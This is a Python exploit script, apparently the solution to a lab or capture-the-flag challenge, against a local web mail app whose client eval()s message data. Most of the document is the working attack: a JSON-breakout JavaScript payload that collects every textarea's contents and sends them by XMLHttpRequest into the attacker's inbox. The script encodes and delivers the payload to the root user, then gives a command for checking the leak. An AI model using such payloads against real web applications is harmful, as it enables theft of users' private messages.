
#!/usr/bin/env python3
import requests
import random

def scramble(s):
    return '-'.join(str(ord(c)) for c in s)

# The vulnerability is in the eval() when PARSING the message
# We need to break out of the JSON and inject JavaScript there
# The client does: eval("(function(){ return " + messageData + ";})()");

# Malicious message that breaks out of JSON and executes code
payload = '''"}; var msgs=document.querySelectorAll('textarea'); var data='STOLEN:'; for(var i=0;i<msgs.length;i++){data+=msgs[i].value+'|||';} var xhr=new XMLHttpRequest(); xhr.open('GET','/$'+Math.random()+'?msg='+encodeURIComponent(data)+'&to=105-110-104-105-98-105-116-111-114.inbox'); xhr.send(); var x={"body":"hacked'''

attacker = "inhibitor"
password = "123456"

# Create malformed JSON that will execute code
message = '{"from":"' + attacker + '","subject":"exec","date":"2025","body":"' + payload + '"}'
message += '//END_MSG//'

pad_needed = 16 - (len(message) % 16)
if pad_needed > 0 and pad_needed != 16:
    message += '\x00' * pad_needed

rand = str(random.random()).replace('.', '')
url = f"http://localhost:8080/${rand}?pw={scramble(password)}&un={scramble(attacker)}&msg={scramble(message)}&to={scramble('root')}.inbox"

print("Sending JSON injection payload...")
try:
    requests.get(url, timeout=5)
    print("Payload sent!")
except:
    print("Payload sent (connection closed)")

print("\nNow log in as root, wait 3 seconds, then check:")
print("stat -c '%s' leaked_app/inboxes/105-110-104-105-98-105-116-111-114.inbox")
